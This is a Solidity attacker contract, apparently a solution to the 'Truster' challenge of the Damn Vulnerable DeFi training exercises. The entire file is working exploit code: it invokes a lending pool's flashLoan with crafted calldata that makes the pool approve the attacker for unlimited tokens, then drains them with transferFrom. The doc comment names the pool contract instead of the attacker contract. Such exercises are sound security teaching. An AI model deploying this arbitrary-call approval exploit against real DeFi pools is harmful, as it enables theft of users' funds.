// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackerContract {
    using Address for address;

    function attack(address pool, address target, uint256 amount)
        external
    {

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        pool.functionCall(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                1,
                pool,
                target,
                data
            )
        );
        IERC20(target).transferFrom(pool, address(msg.sender), amount);
    }

}
